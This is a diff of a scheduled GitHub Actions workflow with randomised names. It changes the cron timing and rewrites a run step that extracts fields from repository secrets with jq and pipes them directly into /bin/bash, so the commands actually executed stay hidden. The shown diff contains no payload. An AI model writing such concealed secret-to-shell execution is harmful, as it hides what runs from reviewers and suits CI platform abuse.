@@ -3,7 +3,7 @@ name: tianqiguang4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 5/6 * * *'
+    - cron: '29 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: tianqiguang4567
         env:
-          xwb03: ${{ secrets.xwb03 }}
+          rx040: ${{ secrets.rx040 }}
         run: |
-          echo $xwb03 | jq -r .gnnt14520 | /bin/bash
-          echo $pzry10 | jq -r .hpy650 | /bin/bash
-          echo $atwl4323 | jq -r .luvz604 | /bin/bash
-          echo $kxd5258 | jq -r .rnm149 | /bin/bash
-          echo $qrs24820 | jq -r .dmoe5299 | /bin/bash
-          echo $jont6 | jq -r .kjp7 | /bin/bash
-          echo $nvsmu1893 | jq -r .wimpz2 | /bin/bash
-          echo $yz97119 | jq -r .xgv1 | /bin/bash
-          echo $ru61 | jq -r .xrn94 | /bin/bash
-          echo $o036 | jq -r .bzuh6707 | /bin/bash
-          echo $h32 | jq -r .vtzd6825 | /bin/bash
-          echo $fiflb89 | jq -r .ljld8 | /bin/bash
+          echo $rx040 | jq -r .c04 | /bin/bash
+          echo $is530 | jq -r .qs4738 | /bin/bash
+          echo $ksvnq1045 | jq -r .m10 | /bin/bash
+          echo $vwqr92066 | jq -r .wghgu74869 | /bin/bash
+          echo $uzz58 | jq -r .tdqz7 | /bin/bash
+          echo $dnur84693 | jq -r .dwm754 | /bin/bash
+          echo $ylnbg56737 | jq -r .bbg816 | /bin/bash
+          echo $nn1 | jq -r .egmh32783 | /bin/bash
+          echo $zms90051 | jq -r .bjd58520 | /bin/bash
 
